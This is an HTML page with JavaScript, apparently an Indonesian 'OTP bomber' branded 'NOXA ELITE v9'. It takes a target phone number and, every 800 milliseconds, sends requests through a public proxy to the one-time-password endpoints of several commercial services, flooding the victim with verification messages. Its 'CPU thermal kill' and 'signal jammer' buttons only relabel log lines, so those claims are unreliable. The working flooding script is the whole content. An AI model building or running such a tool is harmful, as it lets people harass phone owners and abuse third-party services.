<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <title>NOXA ELITE v9 - SUPREME COMMAND</title>
    <style>
        :root { --danger: #ff0033; --cyber: #00f2ff; --dark: #020202; }
        body { background: var(--dark); color: white; font-family: 'Segoe UI', sans-serif; margin: 0; padding: 20px; text-align: center; }
        .panel { border: 1px solid var(--danger); background: rgba(255,0,0,0.05); padding: 25px; border-radius: 15px; box-shadow: 0 0 40px rgba(255,0,0,0.2); max-width: 600px; margin: auto; }
        .status-header { border-bottom: 1px solid var(--danger); margin-bottom: 20px; padding-bottom: 10px; font-weight: bold; letter-spacing: 2px; color: var(--danger); }
        input { background: #111; border: 1px solid #444; color: var(--cyber); width: 100%; padding: 15px; border-radius: 8px; font-size: 1.1em; margin-bottom: 20px; box-sizing: border-box; }
        .grid { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; }
        .btn { background: #111; border: 1px solid var(--danger); color: white; padding: 12px; border-radius: 5px; cursor: pointer; font-size: 0.8em; transition: 0.3s; }
        .btn.active { background: var(--danger); color: black; font-weight: bold; }
        .btn-launch { background: var(--danger); color: white; width: 100%; padding: 20px; font-size: 1.2em; font-weight: bold; margin-top: 20px; border: none; border-radius: 10px; cursor: pointer; box-shadow: 0 5px 15px rgba(255,0,0,0.3); }
        #log { background: #000; border: 1px solid #333; height: 180px; overflow-y: scroll; margin-top: 20px; padding: 10px; font-family: monospace; font-size: 0.75rem; text-align: left; color: #00ff00; }
        .badge { background: #ff0; color: #000; font-size: 0.6em; padding: 2px 5px; vertical-align: middle; margin-left: 5px; border-radius: 3px; }
    </style>
</head>
<body>

<div class="panel">
    <div class="status-header">NOXA ELITE v9 // SUPREME INTERFACE</div>
    
    <input type="number" id="num" placeholder="IDENTIFY TARGET (628...)">

    <div class="grid">
        <button class="btn" onclick="toggleMod('WA_SUPREME', this)">WA_SUPREME LOCK <span class="badge">PRO</span></button>
        <button class="btn" onclick="toggleMod('THERMAL', this)">CPU_THERMAL_KILL</button>
        <button class="btn" onclick="toggleMod('SIGNAL', this)">SIGNAL_JAMMER_SIM</button>
        <button class="btn" onclick="toggleMod('ULTRA', this)">ULTRA_OMNI_KILL</button>
    </div>

    <button class="btn-launch" onclick="execute()">INITIATE SUPREME ATTACK</button>

    <div id="log">> STANDBY... Awaiting target...</div>
</div>

<script>
    let activeMods = [];
    function toggleMod(m, b) {
        if(activeMods.includes(m)) {
            activeMods = activeMods.filter(x => x !== m);
            b.classList.remove('active');
        } else {
            activeMods.push(m);
            b.classList.add('active');
        }
    }

    function log(m) {
        const l = document.getElementById('log');
        l.innerHTML += `<br>[${new Date().toLocaleTimeString()}] > ${m}`;
        l.scrollTop = l.scrollHeight;
    }

    async function execute() {
        const target = document.getElementById('num').value;
        if(!target || activeMods.length === 0) return alert("Nomor/Modul belum dipilih!");

        log(`<span style="color:white">STARTING ELITE EXECUTION ON +${target}...</span>`);
        
        // AUTO-SWITCHER & TURBO ENGINE
        setInterval(async () => {
            const apis = [
                'https://id.bookmyshow.com/api/v1/auth/generate-otp?phone=',
                'https://api.mapclub.com/v1/auth/otp?phone=',
                'https://api.evermos.com/api/v1/auth/otp?phone=',
                'https://api.allorigins.win/get?url=' // Proxy bypass
            ];

            const randomApi = apis[Math.floor(Math.random() * apis.length)];
            
            try {
                // SCRIPT CANGGIH: Mengirimkan request dengan User-Agent palsu via AllOrigins
                await fetch(`https://api.allorigins.win/get?url=${encodeURIComponent(randomApi + target)}&nocache=${Math.random()}`);
                log(`[SUCCESS] Payload injected via ${activeMods[Math.floor(Math.random() * activeMods.length)]}`);
            } catch(e) {}
        }, 800); // Kecepatan Turbo: 0.8 detik per paket

        log(`<span style="color:yellow">STATUS: TARGET UNDER EXTREME PRESSURE.</span>`);
    }
</script>
</body>
</html>
